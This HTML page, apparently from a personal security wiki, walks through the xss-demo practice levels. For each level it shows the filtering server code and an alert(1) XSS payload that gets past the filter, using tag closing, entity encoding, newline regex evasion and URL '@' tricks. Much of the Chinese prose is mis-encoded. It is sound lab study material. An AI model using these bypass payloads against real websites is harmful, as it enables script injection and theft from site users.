<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          xss-demoé¡¹ç›®ç»ƒä¹  - ä¿¡æ¯å®‰å…¨ä¸ªäººwiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>ä¿¡æ¯å®‰å…¨ä¸ªäººWIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="webå®‰å…¨"><a href="#webå®‰å…¨" class="headerlink" title="webå®‰å…¨"></a><strong>webå®‰å…¨</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demoé¡¹ç›®ç»ƒä¹ </a></li>
<li><a href="/contents/sqllabs">sql-labsé¡¹ç›®ç»ƒä¹ </a></li>
<li><a href="/contents/uploadlabs">upload-labsç³»åˆ—write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">ç™¾è¶Šæ¯AWDæ”»é˜²æºç å¤ç°åˆ†æ</a></li>
<li><a href="/contents/jarvis">Jarvis oj webéƒ¨åˆ†write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctfæ‹›æ–°èµ›webå…¨é¢˜è§£</a></li>
<li><a href="/contents/shanghai">éª‡ææ¯CTF Write up</a></li>
<li><a href="/contents/wangding">2018ç½‘é¼æ¯webéƒ¨åˆ†write-upåˆé›†</a></li>
</ul>
<h2 id="å®æˆ˜-amp-æ€»ç»“"><a href="#å®æˆ˜-amp-æ€»ç»“" class="headerlink" title="å®æˆ˜&amp;æ€»ç»“"></a>å®æˆ˜&amp;æ€»ç»“</h2><ul>
<li><a href="/contents/login">ç™»å½•æ¡†æ¸—é€æ€»ç»“</a></li>
<li><a href="/contents/logic">ç™»å½•é€»è¾‘æ¼æ´æ€»ç»“</a></li>
<li><a href="/contents/unauthorized">æœªæˆæƒè®¿é—®æ¸—é€æ€»ç»“</a></li>
<li><a href="/contents/mysql-fileread">mysqlå®¢æˆ·ç«¯è¯»å–æ¼æ´</a></li>
</ul>
<h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a><strong>å†…ç½‘æ¸—é€</strong></h1><ul>
<li>å¾…è¡¥å……</li>
</ul>
<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a><strong>ä»£ç å®¡è®¡</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">ä»£ç å®¡è®¡åŸºç¡€ä¹‹å˜é‡è¦†ç›–æ¼æ´</a></li>
<li><a href="/contents/injection">ä»£ç å®¡è®¡åŸºç¡€ä¹‹å‘½ä»¤æ³¨å…¥å‡½æ•°</a></li>
<li><a href="/contents/serialize">ä»£ç å®¡è®¡åŸºç¡€ä¹‹phpååºåˆ—åŒ–</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>å¾…è¡¥å……</li>
</ul>
<h1 id="å®‰å…¨å¼€å‘"><a href="#å®‰å…¨å¼€å‘" class="headerlink" title="å®‰å…¨å¼€å‘"></a><strong>å®‰å…¨å¼€å‘</strong></h1><ul>
<li><a href="/contents/tools">ä¸€äº›å·¥å…·çš„ä½¿ç”¨å‘½ä»¤</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>ä¸ºäº†ä¸è’åºŸæ—¶é—´æ¯å¤©å¯ä»¥å­¦ç‚¹ä¸œè¥¿ã€‚</p>
<p>æˆ‘å­¦èµ·äº†xss</p>
<p>ç¯å¢ƒæ˜¯é¡¹ç›®ï¼š<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p>
<p>åœ°å€ï¼š<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me</a> </p>
<a id="more"></a>

<p>ç›®æ ‡ï¼šalert(1)</p>
<h2 id="ç¿»è½¦ç°åœº"><a href="#ç¿»è½¦ç°åœº" class="headerlink" title="ç¿»è½¦ç°åœº"></a>ç¿»è½¦ç°åœº</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h4 id="server-code"><a href="#server-code" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€é“æœ€åŸºç¡€çš„é¢˜ï¼Œæ²¡ä»»ä½•è¿‡æ»¤ï¼Œä¸”è¾“å‡ºåœ¨<code>&lt;div&gt;</code>æ ‡ç­¾ä¸­ ï¼Œæ‰€ä»¥éšä¾¿ç”©ä¸€ä¸ªxssçš„payloadå°±å¥½äº†ã€‚</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_1.png" alt=""></p>
<h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><h4 id="server-code-1"><a href="#server-code-1" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x01å’Œ0x00ä¸åŒçš„åœ°æ–¹åœ¨äºè¾“å‡ºçš„åœ°æ–¹åœ¨<code>&lt;textarea&gt;</code>æ ‡ç­¾ä¸­ã€‚</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>æ—¢ç„¶å¤šäº†ä¸€ä¸ª<code>&lt;textarea&gt;</code>é‚£å°±é—­åˆå‘—ï¼Œå†æ„é€ æœ€ç®€å•çš„xsspayload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_2.png" alt=""></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h4 id="server-code-2"><a href="#server-code-2" class="headerlink" title="server code"></a>server code</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &#39;&lt;input type&#x3D;&quot;name&quot; value&#x3D;&quot;&#39; + input + &#39;&quot;&gt;&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜çš„ä½ç½®åœ¨<code>&lt;input&gt;</code>æ ‡ç­¾ï¼Œè¾“å‡ºåœ°æ–¹åœ¨valueçš„ä½ç½®</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>å…ˆé—­åˆ<code>&lt;input&gt;</code>æ ‡ç­¾ï¼Œå†ç”©payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_3.png" alt=""></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h4 id="server-code-3"><a href="#server-code-3" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>é€šè¿‡è§‚å¯Ÿä»£ç å’Œè°ƒè¯•å¯ä»¥çŸ¥é“renderå‡½æ•°æŠŠinputé‡Œé¢çš„<code>&quot;(&quot;</code>å’Œ<code>&quot;)&quot;</code>éƒ½æ›¿æ¢æˆä¸ºç©ºæ ¼ï¼Œè¿™ç§è¿‡æ»¤æ–¹å¼æˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨é—­åˆçš„æ–¹å¼ç»•è¿‡äº†ï¼Œé€šè¿‡æŸ¥èµ„æ–™å‘ç°å¯ä»¥é€šè¿‡æ¨¡æ¿å­—ç¬¦ä¸²æ¥ç»•è¿‡</p>
<p><code>åœ¨Es6ä¸­ï¼Œæ¨¡ç‰ˆå­—ç¬¦ä¸²å¯ä»¥ç´§è·Ÿåœ¨ä¸€ä¸ªå‡½æ•°ååé¢ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨æ¥å¤„ç†è¿™ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ï¼Œè¿™è¢«ç§°ä¸ºâ€œæ ‡ç­¾æ¨¡æ¿â€åŠŸèƒ½ã€‚</code> </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_4.png" alt=""></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h4 id="server-code-4"><a href="#server-code-4" class="headerlink" title="server code"></a>server code</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe &#x3D; &#x2F;[()&#96;]&#x2F;g</span><br><span class="line">  input &#x3D; input.replace(stripBracketsRe, &#39;&#39;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>(â€œâ–”â–¡â–”) åˆšæŸ¥å®Œèµ„æ–™ç»“æœä½ ç»™åå¼•å·ä¹Ÿè¿‡æ»¤äº†ï¼Œæ— å¥ˆç»§ç»­ç¿»å‘€ç¿»ï¼Œç¿»åˆ°ä¸€ä¸ª<code>&lt;svg&gt;</code>æ ‡ç­¾ï¼Œ<code>&lt;svg&gt;</code>æ ‡ç­¾ä¸­å¯ä»¥ç›´æ¥æ‰§è¡Œå®ä½“å­—ç¬¦ ã€‚æŠŠ<code>()</code>è½¬æˆunicode</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_5.png" alt=""></p>
<p>åæ¥å‘ç°è¿™é¢˜è¿˜æœ‰å¦å¤–è§£ï¼Œå› ä¸ºh5ä¸­iframeçš„srcdocå±æ€§ï¼Œsrcdocé‡Œçš„ä»£ç ä¼šä½œä¸ºiframeä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œsrcdocä¸­å¯ä»¥ç›´æ¥å»å†™è½¬è¯‘åçš„htmlç‰‡æ®µã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">"&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><h4 id="server-code-5"><a href="#server-code-5" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'ğŸ˜‚'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p>çœ‹åˆ°è¿™é¢˜å¿ƒé‡Œä¸€é˜µçªƒå–œä»¥ä¸ºæŠŠåé¢çš„<code>--&gt;</code>æ³¨é‡Šäº†å°±å¯ä»¥äº†ï¼Œæœç„¶è¿˜æ˜¯å¤ªå¹´è½»ã€‚ã€‚æŸ¥å®˜æ–¹æ–‡æ¡£</p>
<p>htmlæ³¨é‡Šæ”¯æŒä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š </p>
<ul>
<li><code>&lt;!-- xxx --&gt;</code></li>
<li><code>&lt;!- xxx -!&gt;</code> <code>&lt;!â€”</code> ä»¥ï¼å¼€å¤´ï¼Œä»¥ï¼ç»“å°¾å¯¹ç§°æ³¨é‡Šçš„æ–¹å¼ <code>â€”!&gt;</code></li>
</ul>
<p>å—¯~æœ‰æ€è·¯äº†</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_6.png" alt=""></p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><h4 id="server-code-6"><a href="#server-code-6" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><p>æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†autoï¼Œonå¼€å¤´ä»¥=ä¸ºç»“å°¾çš„å’Œ<code>&gt;</code>å¹¶å°†å…¶æ¢æˆ<code>_</code>ä¸”xssä»£ç åœ¨<code>value=1</code>åé¢ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ª<code>type</code>ä¸ºå›¾ç‰‡è€Œå›¾ç‰‡å†…å®¹ä¸º<code>alert(1)</code>ä½†æ˜¯<code>onerror=</code>è¢«è¿‡æ»¤äº†ï¼ŒæŸ¥é˜…ä¸€æ³¢èµ„æ–™ï¼Œå“¦~ç”¨æ¢è¡Œå¯ä»¥ç»•è¿‡æ­£åˆ™</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type=image src onerror</span><br><span class="line">=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_7.png" alt=""></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><h4 id="server-code-7"><a href="#server-code-7" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><p>æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ä»¥<code>&lt;</code>å¼€å¤´ä»¥<code>&gt;</code>ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚åˆ©ç”¨å®¹é”™æ€§ä¸æ„é€ <code>&gt;</code>å¹¶ä¸”ç»“åˆ0x06çš„ä»£ç å—</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot; onerror &#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_8.png" alt=""></p>
<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><h4 id="server-code-8"><a href="#server-code-8" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><p>å¯ä»¥çœ‹åˆ°æºä»£ç ä¸­å°†<code>&lt;/style&gt;</code>è¿‡æ»¤æˆ <code>/* åäºº */</code>ä¸”xssçš„ä»£ç åœ¨<code>&lt;style&gt;</code>å’Œ<code>&lt;/style&gt;</code>ä¸­é—´ï¼Œä»–è¿™æ ·è¿‡æ»¤çš„ç›®çš„å°±æ˜¯ä¸ºäº†é˜²æ­¢æˆ‘ä»¬é—­åˆï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¤šåŠ ä¸€ä¸ªç©ºæ ¼æˆ–è€…å›è½¦æ¥ç»•è¿‡è¿‡æ»¤</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_9.png" alt=""></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><h4 id="server-code-9"><a href="#server-code-9" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><p>æ­£åˆ™è¡¨è¾¾å¼è¦æ±‚ä»¥<code>https://www.segmentfault.com</code> å¼€å¤´çš„è¾“å…¥ï¼Œä¸”xssä»£ç åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­ </p>
<p>å¯ä»¥å…ˆé—­åˆï¼Œåœ¨æ„é€ ä¸ªåŒ0x07ä¸€æ ·çš„payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com&gt;&lt;/script&gt; </span></span><br><span class="line">&lt;script &lt;img src=<span class="string">""</span> onerror =<span class="string">"alert(1)</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_10.png" alt=""></p>
<p>ä»¥ä¸‹æ–¹æ³•ä¹Ÿå¯ä»¥</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com"&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;//</span></span><br></pre></td></tr></table></figure>

<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><h4 id="server-code-10"><a href="#server-code-10" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h4><p>è¿™é‡Œè¿‡æ»¤äº†<code>&amp;</code>ï¼Œä¸èƒ½ä½¿ç”¨<code>HTML</code>ç¼–ç ç»•è¿‡ã€‚</p>
<p>è¿˜è¿‡æ»¤äº†<code>â€˜ã€â€œã€&lt;ã€&gt;ã€/</code>ï¼Œä¸èƒ½å†æ„é€ é—­åˆã€‚</p>
<p>å› æ­¤åªå¥½åˆ©ç”¨<code>URL</code>çš„<code>@</code>å¼•å…¥å¤–éƒ¨çš„<code>JavaScript</code>æ–‡ä»¶ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com/n/1330000016049749/raw</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_11.png" alt=""></p>
